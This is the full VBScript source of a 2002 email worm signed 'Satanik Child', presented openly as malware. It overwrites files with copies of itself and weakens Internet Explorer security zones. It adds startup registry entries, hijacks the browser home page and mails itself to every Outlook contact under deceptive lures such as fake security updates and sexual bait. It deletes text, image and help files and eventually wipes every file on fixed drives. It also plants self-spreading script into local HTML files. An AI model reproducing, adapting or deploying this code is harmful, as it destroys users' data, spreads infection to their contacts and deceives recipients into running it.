'I-Worm.MyRevenge
'Created By Satanik Child
'2002 keep the infection alive!
'Independent Virus Writer
'                __                ____ __            .__    ____.__       .___
'  ___________ _/  |______    ____/_   |  | __   ____ |  |__/_   |  |    __| _/
' /  ___/\__  \\   __\__  \  /    \|   |  |/ / _/ ___\|  |  \|   |  |   / __ | 
' \___ \  / __ \|  |  / __ \|   |  \   |    <  \  \___|   Y  \   |  |__/ /_/ | 
'/____  >(____  /__| (____  /___|  /___|__|_ \  \___  >___|  /___|____/\____ | 
'     \/      \/          \/     \/         \/      \/     \/               \/ 
'

Dim oFIL, WSH, FSO, oINF
On Error Resume Next
Randomize
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = Wscript.CreateObject("Wscript.Shell")
oFIL = Wscript.ScriptFullName
oINF = Left(oFIL, InStrRev(oFIL, "\"))
For Each target in FSO.GetFolder(oINF).Files
	FSO.CopyFile oFIL, target.Name, 1
Next

Set oWSH = CreateObject("WScript.Shell")
oWSH.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1004", 0, "REG_DWORD"
oWSH.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201", 0, "REG_DWORD"
oWSH.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004", 0, "REG_DWORD"
oWSH.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "REG_DWORD"
oWSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1004", 0, "REG_DWORD"
oWSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201", 0, "REG_DWORD"
oWSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004", 0, "REG_DWORD"
oWSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "REG_DWORD"

FSO.CopyFile WScript.ScriptFullName, FSO.GetSpecialFolder(0) & "\One.vbs"
FSO.CopyFile WScript.ScriptFullName, FSO.GetSpecialFolder(1) & "\Two.vbs"
FSO.CopyFile WScript.ScriptFullName, FSO.GetSpecialFolder(0) & "\Help\Three.vbs"
FSO.CopyFile WScript.ScriptFullName, FSO.GetSpecialFolder(1) & "\Drivers\Four.vbs"
FSO.CopyFile WScript.ScriptFullName, FSO.GetSpecialFolder(0) & "\Fonts\Five.vbs"


lot = Int((5 * Rnd) + 1)
If lot = 1 Then
	WSH.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.pheer.de/exploits.html"
	WSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Fith", "%SystemRoot%\Fonts\Five.vbs"
ElseIf lot = 2 Then
	WSH.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.xpwarez.cjb.net/"
	WSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Second", "Two.vbs"
ElseIf lot = 3 Then
	WSH.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.pheer.de/exploits.html"
	WSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\First", "%SystemRoot%\One.vbs"
ElseIf lot = 4 Then
	WSH.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.xpwarez.cjb.net/"
	WSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Fourth", "%SystemRoot%\System\Drivers\Four.vbs"
ElseIf lot = 5 Then
	WSH.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.pheer.de/exploits.html"
	WSH.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Third", "%SystemRoot%\Help\Three.vbs"
End If

On Error Resume Next
Dim X, A, B, CTRLST, oENTRS, eMAIL, oREG, vREG, aREG, virWRT, ODRNFO, TXT, MSO, oMAP

Set oREG = CreateObject("WScript.Shell")
Set MSO = WScript.CreateObject("Outlook.Application")
Set oMAP = MSO.GetNameSpace("MAPI")

For CTRLST = 1 to oMAP.AddressLists.Count
	Set A = oMAP.AddressLists(CTRLST)
	X = 1
	Randomize Timer
	
	ODRNFO = INT(RND * 16) + 1 
	
	If ODRNFO = 1 Then
		virWRT = "Windows Update"
		TXT = "Have you heard there is a new security update.  I thought I would save you time and give it to you.  Make sure to pass it on to someone else."
	End If
	If ODRNFO = 2 Then
		virWRT = "Hey!!!!"
		TXT = "I havent heard from you in so long!  I got you a little something, its a card I made in visual basic script!"
	End If
	If ODRNFO = 3 Then
		virWRT = "Hey Homie don't you know me?  You knew me when you blew me!"
		TXT = "I love that one it always gets their attention!! Speaking of attention, pay attention to the attached file its something you need to read."
	End If
	If ODRNFO = 4 Then
		virWRT = "Wutz up?"
		TXT = "Wuuuuuuuuuuuuuutz UUUUUUUUUUUUUUUUp? I was thinking about you when I found this take a look and see why."
	End If
	If ODRNFO = 5 Then
		virWRT = "Make life a whole lot easier! "
		TXT = "Do you hate those long and boring commands? Well, run the attached file and see how life can be so much easier!"
	End If	
	If ODRNFO = 6 Then
		virWRT = "Virus News:"
		TXT = " A new Virus is going around, the attached file is a little proggie I did to combat it!  Run it and be protected!"
	End If
	If ODRNFO = 7 Then
		virWRT = "Hey Babe!"
		TXT = "Have I shown this to you yet? Well, if I havent then open the attachment and prepare to laugh!"
	End If
	If ODRNFO = 8 Then
		virWRT = "Nasty & Horny Me"
		TXT = "I couldnt stop thinking about you last nite so I got a little nasty check out IN DETAIL what I did to satisfy myself last nite.  Open and read the attachment!"
	End If
	If ODRNFO = 9 Then
		virWRT = "God Damn You!"
		TXT = "Why did you send me this?  Is this your idea of a fucken Joke?  I should report you for sending me this yesterday!  How could you?"
	End If
	If ODRNFO = 10 Then
		virWRT = "Your requested info"
		TXT = "Im sorry it took me forever to get back to you but atleast I didnt forget completely.  Here is what you wanted me to get for you."
	End If
	If ODRNFO = 11 Then
		virWRT = "I forgot to tell you something..."
	End If
	If ODRNFO = 12 Then
		TXT = "Attached File, look at it .. It is in visual basic script"
	End If
	If ODRNFO = 13 Then
		virWRT = "OOPS!"
		TXT = "Im so sorry!  I feel so bad for forgetting your bday!"&VbCrLf&VbTab&"HAPPY belated BIRTHSDAY!"&VbCrLf&"To make up for it, here take a look at the attachment!"
	End If
	If ODRNFO = 14 Then
		virWRT = "Lets have some FUN!"
		TXT = "If you want to see me naked read the attached file on how to find me!"
	End If
	If ODRNFO = 15 Then
		virWRT = "Anti Virus Info! READ!!"
	End If
	If ODRNFO = 16 Then
		virWRT = "Your service is about to get cancelled please read attached file"
	End If

	vREG = oREG.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & A)
		If (vREG = "") Then
			vREG = 1
		End If

	If (int(a.AddressEntries.Count)>int(vREG)) Then
		For oENTRS = 1 to A.AddressEntries.Count
			eMAIL = A.AddressEntries(X)
			aREG = ""
			aREG = oREG.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & eMAIL)
				If (aREG = "") Then
					Set male = MSO.CreateItem(0)
					male.Recipients.Add(eMAIL)
					male.Subject = virWRT
					male.Body = vbcrlf & TXT
					male.Attachments.Add oFIL
					male.Send
					oREG.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & eMAIL, 1, "REG_DWORD"
				End If
			X = X + 1
		Next
			oREG.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & A, A.AddressEntries.Count
	Else
		oREG.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & A, A.AddressEntries.Count
	End If
Next 

Set MSO = Nothing
Set oMAP = Nothing

On Error Resume Next
If Day(Now()) = 01 or Day(Now()) = 03 or Day(Now()) = 05 or Day(Now()) = 07 or Day(Now()) = 09 or Day(Now()) = 11 or Day(Now()) = 13 or Day(Now()) = 15 or Day(Now()) = 17 or Day(Now()) = 19 or Day(Now())= 21 or Day(Now()) = 23 or Day(Now()) = 25 or Day(Now()) = 27 or Day(Now()) = 29 or Day(Now()) = 31 Then
Randomize
num = Int((4 * Rnd) + 1)

If num = 1 Then
	WSH.Run (FSO.GetSpecialFolder(0) & "\Command\Deltree /Y %WINDIR%\*.txt")
Else
	WSH.Run (FSO.GetSpecialFolder(1) & "\Cmd.exe /c Del /Q /F %WINDIR%\*.txt") 
End If

If num = 2 Then
	WSH.Run (FSO.GetSpecialFolder(0) & "\Command\Deltree /Y %WINDIR%\SYSTEM\*.txt")
Else
	WSH.Run (FSO.GetSpecialFolder(1) & "\Cmd.exe /c Del /Q /F %WINDIR%\SYSTEM32\*.txt")
End If

If num = 3 Then
	WSH.Run (FSO.GetSpecialFolder(0) & "\Command\Deltree /Y %WINDIR%\*.jpg")
Else
	WSH.Run (FSO.GetSpecialFolder(1) & "\Cmd.exe /c Del /Q /F %WINDIR%\*.jpg")
End If

If num = 4 Then
	WSH.Run (FSO.GetSpecialFolder(0) & "\Command\Deltree /Y %WINDIR%\Help\*.hlp")
Else
	WSH.Run (FSO.GetSpecialFolder(1) & "\Cmd.exe /c Del /Q /F %WINDIR%\Help\*.hlp")
End If
End If

RWRT = WSH.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Cntr")
If RWRT >= 1 Then
	CTR = RWRT
Else
	CTR = 0
	WSH.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Cntr", CTR
End If

If CTR = 0 Then
	RWRT = WSH.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\FldrCtr")
		If RWRT >= 1 Then
			FLDCTR = RWRT
		Else
			FLDCTR = 0
		WSH.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\FldrCtr", FLDCTR
		End If
	Set fldr = FSO.CreateFolder(FSO.GetSpecialFolder(1) & "\I.WORM" & FLDCTR)
		For i = 1 to 666
			Set FILE = FSO.CreateTextFile(FSO.GetSpecialFolder(1) & "\I.WORM" & FLDCTR & "\I.Worm" & i & ".vbs", 2, False)
			Set x = FSO.OpenTextFile(WScript.ScriptFullName, 1)
			codecopy = x.ReadAll
			FILE.Write codecopy
			FILE.Close
			Set attr = FSO.GetFile(FSO.GetSpecialFolder(1) & "\I.WORM" & FLDCTR & "\I.WORM" & i & ".vbs")
			attr.Attributes = attr.Attributes + 3
			Set attr = FSO.GetFolder(FSO.GetSpecialFolder(1) & "\I.WORM" & FLDCTR)
			attr.Attributes = 0
			attr.Attributes = 3
		Next
			CTR = CTR + 1
			FLDCTR = FLDCTR + 1
	WSH.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\FldrCtr", FLDCTR
Else
	FLDCTR = FLDCTR + 1
	CTR = CTR + 1
End If

If CTR >= 666 Then
	On Error Resume Next
	Dim DRVTYPE, xFILE, VIRPATH, FLE2GET, DRVTPE
	For Each DRVTYPE In FSO.Drives
		If DRVTYPE.DRVTPE = 2 Or DRVTYPE.DRVTPE = 3 Then
			Seeking(DRVTYPE.Path & "\")
		End If
	Next
	Sub Seeking(fspec)
	  On Error Resume Next
	  Set xFILE = FSO.GetFolder(fspec)
	  	For Each VIRPATH In xFILE.Files
			FSO.GetFile(VIRPATH.Path).Attributes = 32
			FSO.DeleteFile VIRPATH.Path
		Next
		For Each FLE2GET In xFILE.SubFolders
			Seeking(FLE2GET.Path)
		Next
	End Sub
		CTR = 0
End If



If Not (FSO.FolderExists(FSO.GetSpecialFolder(0) & "\Start Menu\Programs\StartUp")) Then
	STRTUP = WSH.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\StartUp")
	Set HTAFILE = CreateObject("Scriptlet.Typelib")
	HTAFILE.PATH = STRTUP & "\WINXP.HTA"
	HTAFILE.DOC = oHta.Doc = "<" & "HTML>"&VbCrLf&"<" & "body bgcolor=""#000000"">"&VbCrLf&"<" & "div id='nap' style='position: absolute; text-align:center; top:60; left:0; font-size:40pt; font-family:Arial; font-weight:bold; color:#0066CC; FILTER:Light();'>"&"&nbsp;&nbsp; Greetings From Satanik Child! <" & "/div>"&Chr(13)&Chr(10)&"<" & "SCRIPT language=""VBScript""><!--"&Chr(13)&Chr(10)&"d=1:n=30:call fsn"&Chr(13)&Chr(10)&"Sub fsn"&Chr(13)&Chr(10)&"If n>=400 Then d=0"&Chr(13)&Chr(10)&"If n=<70 Then d=1"&Chr(13)&Chr(10)&"If d=1 Then n=n+10 Else n=n-10"&Chr(13)&Chr(10)&"Set o=nap.Filters(""Light"")"&Chr(13)&Chr(10)&"Call o.Clear()"&Chr(13)&Chr(10)&"Call o.AddAmbient(200,200,200,100)"&Chr(13)&Chr(10)&"Call o.AddPoint(n,35,25,200,200,200,100)"&Chr(13)&Chr(10)&"SetTimeout ""Call fsn"",80"&Chr(13)&Chr(10)&"End Sub"&Chr(13)&Chr(10)&"/"&"/"&"-->"&VbCrLf&"<" & "/SCRIPT>"&VbCrLf&"<" & "/HTML>"
	HTAFILE.Write
Else  
	Set oHta = CreateObject("Scriptlet.Typelib")
	oHta.Path = FSO.GetSpecialFolder(0) & "\Start Menu\Programs\StartUp\file2.hta"
	oHta.Doc = "<" & "HTML>"&VbCrLf&"<" & "body bgcolor=""#000000"">"&VbCrLf&"<" & "div id='nap' style='position: absolute; text-align:center; top:60; left:0; font-size:40pt; font-family:Arial; font-weight:bold; color:#0066CC; FILTER:Light();'>"&"&nbsp;&nbsp; Greetings From Satanik Child! <" & "/div>"&Chr(13)&Chr(10)&"<" & "SCRIPT language=""VBScript""><!--"&Chr(13)&Chr(10)&"d=1:n=30:call fsn"&Chr(13)&Chr(10)&"Sub fsn"&Chr(13)&Chr(10)&"If n>=400 Then d=0"&Chr(13)&Chr(10)&"If n=<70 Then d=1"&Chr(13)&Chr(10)&"If d=1 Then n=n+10 Else n=n-10"&Chr(13)&Chr(10)&"Set o=nap.Filters(""Light"")"&Chr(13)&Chr(10)&"Call o.Clear()"&Chr(13)&Chr(10)&"Call o.AddAmbient(200,200,200,100)"&Chr(13)&Chr(10)&"Call o.AddPoint(n,35,25,200,200,200,100)"&Chr(13)&Chr(10)&"SetTimeout ""Call fsn"",80"&Chr(13)&Chr(10)&"End Sub"&Chr(13)&Chr(10)&"/"&"/"&"-->"&VbCrLf&"<" & "/SCRIPT>"&VbCrLf&"<" & "/HTML>"
	oHta.Write
End If


On Error Resume Next
Dim VARX, VAR1, objA, objB, objC, objD, objE, objF, objX, objO, objW
Dim WinFile, HTMF, oFSO
Set oFSO = CreateObject("Scripting.FileSystemObject")
objA = "<Satanik_Child>" & vbcrlf & _
"<HTML><TITLE>XXX<?-?TITLE>" & vbcrlf & _
"<BODY bgcolor=@-@#000000@-@>" & vbcrlf & _
"<DIV id=#-#nap#-# style=#-#position: absolute; text-align:center; top:60; left:0; font-size:40pt; font-family:Arial; font-weight:bold; color:#0066CC; FILTER:Light();#-#>&nbsp;&nbsp; This has been a Satanik Child Infection! <?-?div>" & vbcrlf & _
"<SCRIPT LANGUAGE = @-@VBScript@-@><!--" & vbcrlf & _
"d=1:n=30:call fsn" & vbcrlf & _
"Sub fsn" & vbcrlf & _
"If n>=400 Then d=0" & vbcrlf & _
"If n=<70 Then d=1" & vbcrlf & _
"If d=1 Then n=n+10 Else n=n-10" & vbcrlf & _
"Set o=nap.Filters(@-@Light@-@)" & vbcrlf & _
"Call o.Clear()" & vbcrlf & _
"Call o.AddAmbient(200,200,200,100)" & vbcrlf & _
"Call o.AddPoint(n,35,25,200,200,200,100)" & vbcrlf & _
"SetTimeout @-@Call fsn@-@,80" & vbcrlf & _
"End Sub" & vbcrlf & _
"?-??-?-->" & vbcrlf & _
"<?-?SCRIPT>" & vbcrlf & _
"<script language=@-@VBScript@-@>" & vbcrlf & _
"On Error Resume Next" & vbcrlf & _
"Dim objFso, objWsh, objFiles, infFiles, objFile2Inf, objVarA" & vbcrlf & _
"MsgBox @-@Failure To Accept Active X Will Cause A Page Error!@-@, vbExclamation, @-@Internet Explorer@-@" & vbcrlf & _
"Set objFso = CreateObject(@-@Scripting.FileSystemObject@-@)" & vbcrlf & _
"Set objWsh = CreateObject(@-@WScript.Shell@-@)" & vbcrlf & _
"If err.number = 429 Then" & vbcrlf & _
"objWsh.Run javascript:location.reload()" & vbcrlf & _
"Else" & vbcrlf & _
"Set objWinFol = objFso.GetSpecialFolder(0)" & vbcrlf & _
"objGetFol(objWinFol)" & vbcrlf & _
"objGetFol(@-@C:^-^My Documents@-@)" & vbcrlf & _
"objGetFol(objWinFol & @-@^-^System@-@)" & vbcrlf & _
"objGetFol(objWinFol & @-@^-^Temporary Internet Files^-^@-@)" & vbcrlf & _
"objGetFol(@-@C:^-^Program Files^-^Common Files^-^Microsoft Shared^-^Stationery@-@)" & vbcrlf & _
"End If" & vbcrlf & _
"Function objGetFol(dir)" & vbcrlf & _
"If objFso.FolderExists(dir) Then" & vbcrlf & _
"Set objFiles = objFso.GetFolder(dir)" & vbcrlf & _
"Set infFiles = objFiles.Files" & vbcrlf & _
"For Each objFile2Inf in infFiles" & vbcrlf & _
"objVarA = lcase(objFso.GetExtensionName(objFile2Inf.Name))" & vbcrlf & _
"If objVarA = @-@htm@-@ or objVarA = @-@html@-@ or objVarA = @-@htt@-@ or objVarA = @-@mht@-@ Then" & vbcrlf & _
"Set objVarA = objFso.OpenTextFile(objFile2Inf.path, 1, False)" & vbcrlf & _
"If objVarA.ReadLine <> @-@<Satanik_Child>@-@ Then" & vbcrlf & _
"objVarA.Close()" & vbcrlf & _
"Set objVarA = objFso.OpenTextFile(objFile2Inf.path, 1, False)" & vbcrlf & _
"objHtm = objVarA.ReadAll()" & vbcrlf & _
"objVarA.Close()" & vbcrlf & _
"Set objVarA = document.body.createTextRange" & vbcrlf & _
"Set objVarA = objFso.CreateTextFile(objFile2Inf.path, True, False)" & vbcrlf & _
"objVarA.WriteLine @-@<Satanik_Child>@-@" & vbcrlf & _
"objVarA.Write(objHtm)" & vbcrlf & _
"objVarA.WriteLine objVarA.htmltext" & vbcrlf & _
"objVarA.Close()" & vbcrlf & _
"Else" & vbcrlf & _
"objVarA.Close()" & vbcrlf & _
"End If" & vbcrlf & _
"End If" & vbcrlf & _
"Next" & vbcrlf & _
"End If" & vbcrlf & _
"End Function" & vbcrlf & _
"<?-?script>" & vbcrlf & _
""
objC = replace(objA, chr(35) & chr(45)& chr(35), "'")
objC = replace(objC, chr(64) & chr(45) & chr(64), """")
objF = replace(objC, chr(63) & chr(45) & chr(63), "/")
objO = replace(objF, chr(94) & chr(45) & chr(94), "\")
objD = replace(objB, chr(35) & chr(45) & chr(35), "'")
objD = replace(objD, chr(64) & chr(45) & chr(64), """")
objE = replace(objD, chr(63) & chr(45) & chr(63), "/")
objW = replace(objE, chr(94) & chr(45) & chr(94), "\")
Set c = oFSO.OpenTextFile(WScript.ScriptFullName, 1)
VARX = Split(c.ReadAll, vbcrlf)
objX = ubound(VARX)
For VAR1 = 0 to ubound(VARX)
	VARX(VAR1) = replace(VARX(VAR1), "'", chr(91) + chr(45) + chr(91))
	VARX(VAR1) = replace(VARX(VAR1), """", chr(93) + chr(45) + chr(93))
	VARX(VAR1) = replace(VARX(VAR1), "\", chr(37) + chr(45) + chr(37))
		If (objX = VAR1) Then
			VARX(VAR1) = Chr(34) + VARX(VAR1) + chr(34)
		Else
			VARX(VAR1) = chr(34) + VARX(VAR1) + chr(34) & "&vbcrlf& _"
		End If
Next
Set WinFile = oFSO.CreateTextFile(oFSO.GetSpecialFolder(1) + "\StartUp.htm")
WinFile.close
Set HTMF = oFSO.OpenTextFile(oFSO.GetSpecialFolder(1) + "\StartUp.htm", 2)
HTMF.write objO
HTMF.write join(VARX, vbcrlf)
HTMF.write vbcrlf
HTMF.write objW
HTMF.close
oFSO.CopyFile oFSO.GetSpecialFolder(1) & "\StartUp.htm",oFSO.GetSpecialFolder(0) & "\Win98.htm"	

'                __                ____ __            .__    ____.__       .___
'  ___________ _/  |______    ____/_   |  | __   ____ |  |__/_   |  |    __| _/
' /  ___/\__  \\   __\__  \  /    \|   |  |/ / _/ ___\|  |  \|   |  |   / __ | 
' \___ \  / __ \|  |  / __ \|   |  \   |    <  \  \___|   Y  \   |  |__/ /_/ | 
'/____  >(____  /__| (____  /___|  /___|__|_ \  \___  >___|  /___|____/\____ | 
'     \/      \/          \/     \/         \/      \/     \/               \/ 
'
	
'SATANIK CHILDS LATEST INFECTION
